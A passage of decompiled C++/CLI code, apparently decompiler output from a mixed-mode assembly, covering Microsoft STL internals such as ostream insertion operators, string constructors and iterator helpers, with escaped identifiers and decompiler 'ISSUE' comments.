    [In] _Deque_const_iterator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u002C1\u003E* obj0,
    int _Off)
  {
    if ((*(int*) obj0 != 0 ? 1 : 0) == 0)
      \u003CModule\u003E._invalid_parameter_noinfo();
    uint num1 = (uint) *(int*) obj0;
    _Container_base_aux* containerBaseAuxPtr1 = num1 == 0U ? (_Container_base_aux*) 0 : (_Container_base_aux*) *(int*) num1;
    _Container_base_aux* containerBaseAuxPtr2 = num1 == 0U ? (_Container_base_aux*) 0 : (_Container_base_aux*) *(int*) num1;
    int num2 = _Off + *(int*) ((IntPtr) obj0 + 4);
    if ((uint) num2 <= (uint) (*(int*) ((IntPtr) containerBaseAuxPtr2 + 28) + *(int*) ((IntPtr) containerBaseAuxPtr1 + 24)))
    {
      _Container_base_aux* containerBaseAuxPtr3 = num1 == 0U ? (_Container_base_aux*) 0 : (_Container_base_aux*) *(int*) num1;
      if ((uint) num2 >= (uint) *(int*) ((IntPtr) containerBaseAuxPtr3 + 24))
        goto label_5;
    }
    \u003CModule\u003E._invalid_parameter_noinfo();
label_5:
    *(int*) ((IntPtr) obj0 + 4) = *(int*) ((IntPtr) obj0 + 4) + _Off;
    return obj0;
  }

  internal static unsafe basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(
    basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* _Ostr,
    sbyte _Ch)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    int num2 = 0;
    basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E.sentry sentry;
    \u003CModule\u003E.std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esentry\u002E\u007Bctor\u007D(&sentry, _Ostr);
    // ISSUE: fault handler
    try
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (^(byte&) ((IntPtr) &sentry + 4) != (byte) 0)
      {
        int num3 = \u003CModule\u003E.std\u002Eios_base\u002Ewidth((ios_base*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)) > 1 ? \u003CModule\u003E.std\u002Eios_base\u002Ewidth((ios_base*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)) - 1 : 0;
        try
        {
          if ((\u003CModule\u003E.std\u002Eios_base\u002Eflags((ios_base*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)) & 448) != 64)
          {
            while (num2 == 0)
            {
              if (0 < num3)
              {
                if (\u003CModule\u003E.std\u002Echar_traits\u003Cchar\u003E\u002Eeq_int_type(&-1, &\u003CModule\u003E.std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esputc(\u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)), \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Efill((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)))))
                  num2 = 4;
                --num3;
              }
              else
                goto label_9;
            }
            goto label_24;
          }
label_9:
          if (\u003CModule\u003E.std\u002Echar_traits\u003Cchar\u003E\u002Eeq_int_type(&-1, &\u003CModule\u003E.std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esputc(\u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)), _Ch)))
            num2 = 4;
          while (num2 == 0)
          {
            if (0 < num3)
            {
              if (\u003CModule\u003E.std\u002Echar_traits\u003Cchar\u003E\u002Eeq_int_type(&-1, &\u003CModule\u003E.std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esputc(\u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)), \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Efill((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)))))
                num2 = 4;
              --num3;
            }
            else
              break;
          }
        }
        catch (Exception ex1) when (
        {
          // ISSUE: unable to correctly present filter
          uint exceptionCode = (uint) Marshal.GetExceptionCode();
          if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
          uint num4 = 0;
          \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
          try
          {
            try
            {
              \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esetstate((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr), 4, true);
              goto label_24;
            }
            catch (Exception ex2) when (
            {
              // ISSUE: unable to correctly present filter
              num4 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
              if (num4 != 0U)
              {
                SuccessfulFiltering;
              }
              else
                throw;
            }
            )
            {
            }
            if (num4 != 0U)
              throw;
          }
          finally
          {
            \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num4);
          }
        }
      }
label_24:
      \u003CModule\u003E.std\u002Eios_base\u002Ewidth((ios_base*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr), 0);
      \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esetstate((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr), num2, false);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esentry\u002E\u007Bdtor\u007D), (void*) &sentry);
    }
    // ISSUE: fault handler
    try
    {
      if (!\u003CModule\u003E.std\u002Euncaught_exception())
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        \u003CModule\u003E.std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Osfx((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ^(int&) ref sentry);
      }
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Sentry_base\u002E\u007Bdtor\u007D), (void*) &sentry);
    }
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if ((IntPtr) \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) ^(int&) ref sentry + 4) + ^(int&) ref sentry)) != IntPtr.Zero)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      \u003CModule\u003E.std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Unlock(\u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) ^(int&) ref sentry + 4) + ^(int&) ref sentry)));
    }
    return _Ostr;
  }

  internal static unsafe basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(
    basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* _Ostr,
    sbyte* _Val)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    int num2 = 0;
    int num3 = (int) \u003CModule\u003E.std\u002Echar_traits\u003Cchar\u003E\u002Elength(_Val);
    int num4 = \u003CModule\u003E.std\u002Eios_base\u002Ewidth((ios_base*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)) <= 0 || \u003CModule\u003E.std\u002Eios_base\u002Ewidth((ios_base*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)) <= num3 ? 0 : \u003CModule\u003E.std\u002Eios_base\u002Ewidth((ios_base*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)) - num3;
    basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E.sentry sentry;
    \u003CModule\u003E.std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esentry\u002E\u007Bctor\u007D(&sentry, _Ostr);
    // ISSUE: fault handler
    try
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if (^(byte&) ((IntPtr) &sentry + 4) == (byte) 0)
      {
        num2 = 4;
      }
      else
      {
        try
        {
          if ((\u003CModule\u003E.std\u002Eios_base\u002Eflags((ios_base*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)) & 448) != 64)
          {
            for (; 0 < num4; --num4)
            {
              if (\u003CModule\u003E.std\u002Echar_traits\u003Cchar\u003E\u002Eeq_int_type(&-1, &\u003CModule\u003E.std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esputc(\u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)), \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Efill((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)))))
              {
                num2 |= 4;
                break;
              }
            }
            if (num2 != 0)
              goto label_15;
          }
          if (\u003CModule\u003E.std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esputn(\u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)), _Val, num3) != num3)
          {
            num2 = 4;
          }
          else
          {
            for (; 0 < num4; --num4)
            {
              if (\u003CModule\u003E.std\u002Echar_traits\u003Cchar\u003E\u002Eeq_int_type(&-1, &\u003CModule\u003E.std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esputc(\u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)), \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Efill((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)))))
              {
                num2 |= 4;
                break;
              }
            }
          }
label_15:
          \u003CModule\u003E.std\u002Eios_base\u002Ewidth((ios_base*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr), 0);
        }
        catch (Exception ex1) when (
        {
          // ISSUE: unable to correctly present filter
          uint exceptionCode = (uint) Marshal.GetExceptionCode();
          if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
          uint num5 = 0;
          \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
          try
          {
            try
            {
              \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esetstate((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr), 4, true);
              goto label_24;
            }
            catch (Exception ex2) when (
            {
              // ISSUE: unable to correctly present filter
              num5 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
              if (num5 != 0U)
              {
                SuccessfulFiltering;
              }
              else
                throw;
            }
            )
            {
            }
            if (num5 != 0U)
              throw;
          }
          finally
          {
            \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num5);
          }
        }
      }
label_24:
      \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esetstate((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr), num2, false);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esentry\u002E\u007Bdtor\u007D), (void*) &sentry);
    }
    // ISSUE: fault handler
    try
    {
      if (!\u003CModule\u003E.std\u002Euncaught_exception())
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        \u003CModule\u003E.std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Osfx((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ^(int&) ref sentry);
      }
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Sentry_base\u002E\u007Bdtor\u007D), (void*) &sentry);
    }
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if ((IntPtr) \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) ^(int&) ref sentry + 4) + ^(int&) ref sentry)) != IntPtr.Zero)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      \u003CModule\u003E.std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Unlock(\u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) ^(int&) ref sentry + 4) + ^(int&) ref sentry)));
    }
    return _Ostr;
  }

  internal static unsafe basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D\u003Cclass\u0020std\u003A\u003A_Vector_iterator\u003Cwchar_t\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _First,
    _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Last)
  {
    allocator\u003Cwchar_t\u003E allocatorWcharT;
    \u003CModule\u003E.std\u002E_String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D((_String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) obj0, \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT));
    \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Tidy(obj0, false, 0U);
    forward_iterator_tag __unnamed002;
    \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003A_Vector_iterator\u003Cwchar_t\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E(obj0, _First, _Last, __unnamed002);
    return obj0;
  }

  internal static unsafe basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D\u003Cclass\u0020std\u003A\u003A_String_iterator\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u0020\u003E(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E _First,
    _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E _Last)
  {
    allocator\u003Cwchar_t\u003E allocatorWcharT;
    \u003CModule\u003E.std\u002E_String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D((_String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) obj0, \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT));
    \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Tidy(obj0, false, 0U);
    forward_iterator_tag __unnamed002;
    \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003A_String_iterator\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u0020\u003E(obj0, _First, _Last, __unnamed002);
    return obj0;
  }

  internal static unsafe basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D\u003Cclass\u0020std\u003A\u003Aistreambuf_iterator\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u0020\u003E(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    istreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E _First,
    istreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E _Last)
  {
    allocator\u003Cchar\u003E allocatorChar;
    \u003CModule\u003E.std\u002E_String_val\u003Cchar\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D((_String_val\u003Cchar\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) obj0, \u003CModule\u003E.std\u002Eallocator\u003Cchar\u003E\u002E\u007Bctor\u007D(&allocatorChar));
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Tidy(obj0, false, 0U);
    input_iterator_tag inputIteratorTag;
    input_iterator_tag __unnamed002 = inputIteratorTag;
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003Aistreambuf_iterator\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u0020\u003E(obj0, _First, _Last, __unnamed002);
    return obj0;
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static unsafe bool std\u002Eoperator\u0021\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(
    istreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* _Left,
    istreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* _Right)
  {
    if (*(byte*) ((IntPtr) _Left + 4) == (byte) 0)
    {
      int num1 = (int) \u003CModule\u003E.std\u002Eistreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Peek(_Left);
    }
    if (*(byte*) ((IntPtr) _Right + 4) == (byte) 0)
    {
      int num2 = (int) \u003CModule\u003E.std\u002Eistreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Peek(_Right);
    }
    if (*(int*) _Left == 0)
    {
      if (*(int*) _Right != 0)
        goto label_8;
    }
    else if (*(int*) _Right == 0)
      goto label_8;
    int num3 = 1;
    goto label_9;
label_8:
    num3 = 0;
label_9:
    return (byte) num3 == (byte) 0;
  }

  internal static unsafe char* std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Umove\u003Cwchar_t\u0020\u002A\u003E(
    [In] vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    char* _First,
    char* _Last,
    char* _Ptr)
  {
    uint num1 = (uint) ((IntPtr) _Last - (IntPtr) _First >> 1);
    int num2 = (int) num1 * 2;
    IntPtr num3 = num2 + (IntPtr) _Ptr;
    if (num1 <= 0U)
      return (char*) num3;
    \u003CModule\u003E.memmove_s((void*) _Ptr, (uint) num2, (void*) _First, (uint) num2);
    return (char*) num3;
  }

  internal static unsafe char* stdext\u002E_Unchecked_move_backward\u003Cwchar_t\u0020\u002A\u002Cwchar_t\u0020\u002A\u003E(
    char* _First,
    char* _Last,
    char* _Dest)
  {
    int num1 = (int) ((IntPtr) _Last - (IntPtr) _First >> 1);
    int num2 = num1 * 2;
    char* chPtr = (char*) ((IntPtr) _Dest - num2);
    if (num1 > 0)
      \u003CModule\u003E.memmove_s((void*) chPtr, (uint) num2, (void*) _First, (uint) num2);
    return chPtr;
  }

  internal static unsafe basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E** stdext\u002Eunchecked_uninitialized_copy\u003Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u0020\u002A\u002Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u0020\u002A\u002Cclass\u0020std\u003A\u003Aallocator\u003Cclass\u0020std\u003A\u003Abasic_string\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u002A\u003E\u0020\u003E(
    basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E** _First,
    basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E** _Last,
